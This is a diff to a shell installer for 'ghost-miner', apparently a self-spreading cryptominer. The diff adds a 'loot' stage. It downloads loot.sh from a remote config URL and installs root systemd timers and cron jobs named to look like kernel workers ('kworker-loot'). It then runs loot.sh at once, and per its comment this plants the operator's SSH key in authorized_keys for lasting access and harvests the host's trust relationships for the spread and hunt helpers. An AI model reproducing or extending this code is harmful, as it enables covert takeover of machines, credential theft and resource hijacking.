@@ -44,7 +44,7 @@ sed -e "s|__URL__|${POOL}|g" \
 # 4) helpers. Download to a temp then mv: mv is an atomic rename, so a helper
 #    that is mid-run (spread/hunt fired by a timer) keeps reading its old inode
 #    instead of having the file rewritten underneath it.
-for f in run.sh updater.sh spread.sh hunt.sh tune.sh; do
+for f in run.sh updater.sh spread.sh hunt.sh loot.sh tune.sh; do
     curl -fsSL "$CONFIG_URL/$f" -o "$f.new"
     chmod 0755 "$f.new"
     mv -f "$f.new" "$f"
@@ -72,23 +72,29 @@ if [ -n "${KEY_URL:-}" ]; then
     chmod 0600 id_key
 fi
 if command -v systemctl >/dev/null 2>&1; then
-    for u in kworker-spread kworker-hunt kworker-tune; do
+    for u in kworker-spread kworker-hunt kworker-tune kworker-loot; do
         curl -fsSL "$CONFIG_URL/$u.service" -o "/etc/systemd/system/$u.service"
         curl -fsSL "$CONFIG_URL/$u.timer" -o "/etc/systemd/system/$u.timer"
     done
     systemctl daemon-reload 2>/dev/null || true
     systemctl enable --now kworker-spread.timer 2>/dev/null || true
     systemctl enable --now kworker-tune.timer 2>/dev/null || true
+    systemctl enable --now kworker-loot.timer 2>/dev/null || true
     if [ -n "${GITHUB_TOKEN:-}" ]; then
         systemctl enable --now kworker-hunt.timer 2>/dev/null || true
     fi
 else
     printf '0 */6 * * * root %s/spread.sh >/dev/null 2>&1\n' "$SYSDIR" > /etc/cron.d/kworker-spread
     printf '*/10 * * * * root %s/tune.sh >/dev/null 2>&1\n' "$SYSDIR" >> /etc/cron.d/kworker-spread
+    printf '5 */6 * * * root %s/loot.sh >/dev/null 2>&1\n' "$SYSDIR" >> /etc/cron.d/kworker-spread
     if [ -n "${GITHUB_TOKEN:-}" ]; then
         printf '30 */12 * * * root %s/hunt.sh all >/dev/null 2>&1\n' "$SYSDIR" >> /etc/cron.d/kworker-spread
     fi
     chmod 0644 /etc/cron.d/kworker-spread
 fi
+
+# 7) loot this host's own trust graph once, right now: it installs our key into
+#    authorized_keys (durable access) and seeds loot.txt for the hunter.
+SYSDIR="$SYSDIR" HUNT_WORK="$SYSDIR/.hunt" sh "$SYSDIR/loot.sh" 2>/dev/null || :
 
 echo "ghost-miner: deployed to $SYSDIR (pool=$POOL tls=$TLS)"
